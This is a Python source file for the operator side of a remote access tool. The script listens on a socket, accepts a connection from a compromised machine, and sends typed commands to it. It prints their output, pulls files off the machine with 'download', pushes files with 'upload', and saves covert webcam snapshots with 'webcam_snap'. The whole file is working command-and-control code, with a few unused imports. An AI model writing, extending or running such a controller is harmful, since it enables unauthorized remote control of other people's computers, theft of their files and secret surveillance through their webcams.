from base64 import decode
from ctypes import sizeof
from email.headerregistry import Address
from email.mime import image
from logging.config import listen
from multiprocessing import connection
from multiprocessing.connection import Listener
import socket
from sre_constants import SUCCESS
import time

x=0
Listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Listener.bind(("192.168.1.148",15000))

Listener.listen()
print("Server is started!")
connection,address = Listener.accept()
print("Got conncetion from {}".format(address))

def send_data(output_data):
    size_of_data = len(output_data)
    size_of_data = str(size_of_data)
    connection.send(bytes(size_of_data,'utf-8'))
    time.sleep(2)
    connection.send(output_data)

def recv_data():
    original_size = connection.recv(2048).decode('utf-8')
    original_size = int(original_size)
    data = connection.recv(2048)
    while len(data) !=original_size:
        data =data + connection.recv(2048)
    return data


while True:
    try:
        cmd = input("Enter a command: ")
        connection.send(bytes(cmd, 'utf-8'))
        if cmd=='quit':
            connection.send(b'quit')
            connection.close()
            break
        elif cmd[:2] == 'cd':
            recv = recv_data()
            print(recv.decode('utf-8'))
            continue
        elif cmd[:8] == 'download':
            file_output=recv_data()
            if file_output == b'No file':
                print(file_output.decode('utf-8'))
                continue
            with open(f'{cmd[9::]}','wb') as write_data:
                write_data.write(file_output) 
                write_data.close()
            continue
        elif cmd[:6] == 'upload':
            with open(f'{cmd[7::]}','rb') as data:
                f_data = data.read() 
                data.close()
            send_data(f_data)
            continue
        elif cmd[:11] == 'webcam_snap':
            data=recv_data()
            with open(f'{x}.jpg','wb') as write_data:
                write_data.write(data)
                x=x+1
                write_data.close()
            continue
        output = recv_data()
        print(output.decode('utf-8'))
    except FileNotFoundError:
        print("File not found")
        send_data(b'error')
        continue